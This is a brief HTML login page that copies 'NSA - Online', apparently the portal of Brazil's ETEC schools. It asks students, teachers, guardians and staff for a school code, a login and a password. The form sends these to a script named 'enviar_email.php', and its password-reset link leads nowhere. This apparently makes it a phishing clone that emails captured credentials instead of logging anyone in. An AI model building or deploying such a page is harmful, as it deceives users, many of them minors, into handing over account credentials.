<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>NSA - Online</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div class="container">
    <div class="login-box">
      <img src="nsaonline.png" alt="NSA Online Logo" class="logo">

      <!-- Início do formulário -->
      <form action="enviar_email.php" method="POST" autocomplete="off">
  <div class="form-group">
    <label>Entrar como:</label>
    <select name="perfil" autocomplete="off">
      <option>ALUNO</option>
      <option>ETEC</option>
      <option>PROFESSOR</option>
      <option>RESPONSÁVEL</option>
      <option>SUPERVISÃO</option>
      <option>MONITORAMENTO</option>
    </select>

    <label class="codetec">Cod. Etec:</label>
    <input type="text" name="codetec" class="etec-code" maxlength="4" autocomplete="off">
    <button type="button" class="help-button">?</button>
  </div>

  <div class="form-group">
    <label>RM:</label>
    <input type="text" name="rm" placeholder="Digite seu login" autocomplete="off">
    <label class="codetec">Senha:</label>
    <input type="password" name="senha" id="passwordtam" placeholder="Digite sua senha" autocomplete="off">
    <button type="submit" class="enter-button">ENTRAR</button>
  </div>
</form>

      <!-- Fim do formulário -->

      <a href="#" class="link">Solicitar nova senha</a>

      <div class="app-icons">
        <div>
          <img src="android.png" alt="Android" class="icon">
        </div>
        <div>
          <img src="apple-ios.png" alt="iOS" class="icon">
        </div>
      </div>

      <footer>© Sistema NSA – Desde 2008</footer>
    </div>
  </div>
</body>
</html>
